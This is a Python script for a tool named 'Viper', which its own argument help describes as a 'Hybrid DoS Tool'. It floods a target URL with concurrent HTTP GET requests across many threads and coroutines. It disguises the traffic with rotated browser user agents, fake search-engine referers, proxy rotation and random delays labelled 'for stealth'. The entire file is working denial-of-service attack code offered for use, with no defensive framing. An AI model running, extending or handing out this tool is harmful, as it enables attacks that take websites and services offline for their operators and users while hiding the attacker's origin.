import argparse
import asyncio
import threading
import random
import requests
from itertools import cycle
import time

# Global configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
    "http://www.bing.com/search?q=",
    "http://www.yahoo.com/search?p=",
    "http://duckduckgo.com/?q=",
    "http://www.ask.com/web?q=",
    "http://search.aol.com/aol/search?q=",
    "http://www.baidu.com/s?wd=",
    "http://www.yandex.ru/yandsearch?text=",
    "http://search.yahoo.com/search?p=",
    "http://www.naver.com/search?q=",
    "http://www.daum.net/search?q=",
    "http://www.ecosia.org/search?q=",
    "http://www.qwant.com/?q=",
    "http://www.seznam.cz/hledani?q=",
    "http://www.rambler.ru/search?q=",
]

# Placeholder for proxies
PROXY_LIST = []
PROXY_CYCLE = None

# Logging lock to avoid thread collisions
log_lock = threading.Lock()

# Function to log messages
def log(message):
    with log_lock:
        print(message)

# Function to load proxies from a file
def load_proxies(proxy_file):
    global PROXY_CYCLE
    with open(proxy_file, "r") as f:
        PROXY_LIST.extend([line.strip() for line in f if line.strip()])
    PROXY_CYCLE = cycle(PROXY_LIST)

# Coroutine function for sending HTTP requests asynchronously
async def send_request(url, headers, proxy=None):
    try:
        # Random delay for stealth
        await asyncio.sleep(random.uniform(0.1, 0.5))

        # Choose the appropriate proxy
        proxies = {"http": proxy, "https": proxy} if proxy else None

        # Send the request
        response = requests.get(url, headers=headers, proxies=proxies, timeout=5)

        # Log the result
        log(f"[INFO] Sent request to {url} - Status Code: {response.status_code}")

    except requests.RequestException as e:
        log(f"[ERROR] Request failed: {e}")

# Coroutine loop for handling multiple asynchronous requests
async def coroutine_loop(url, headers, num_requests, proxy=None):
    tasks = []
    for _ in range(num_requests):
        tasks.append(send_request(url, headers, proxy))
    await asyncio.gather(*tasks)

# Thread function for managing coroutines
def thread_function(url, num_coroutines, requests_per_coroutine, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS)
    }
    asyncio.run(coroutine_loop(url, headers, requests_per_coroutine, proxy))

# Monitor thread for dynamic adjustment (placeholder functionality)
def monitor_thread():
    while True:
        log("[MONITOR] Monitoring server response...")
        # Simulate monitoring logic here (e.g., checking server responses, errors)
        # Adjust parameters dynamically based on observations
        time.sleep(10)

# Main execution flow
def main():
    parser = argparse.ArgumentParser(description="Viper - Hybrid DoS Tool with Threads and Coroutines")
    parser.add_argument("--url", required=True, help="Target URL for the attack")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to spawn")
    parser.add_argument("--coroutines", type=int, default=50, help="Number of coroutines per thread")
    parser.add_argument("--requests", type=int, default=10, help="Number of requests per coroutine")
    parser.add_argument("--proxy-file", help="File containing proxy addresses")
    args = parser.parse_args()


    # Load proxies if provided
    if args.proxy_file:
        load_proxies(args.proxy_file)

    threads = []
    for i in range(args.threads):
        proxy = next(PROXY_CYCLE) if PROXY_CYCLE else None
        t = threading.Thread(
            target=thread_function,
            args=(args.url, args.coroutines, args.requests, proxy),
        )
        threads.append(t)
        t.start()

    # Start a monitor thread
    monitor = threading.Thread(target=monitor_thread, daemon=True)
    monitor.start()

    # Wait for threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
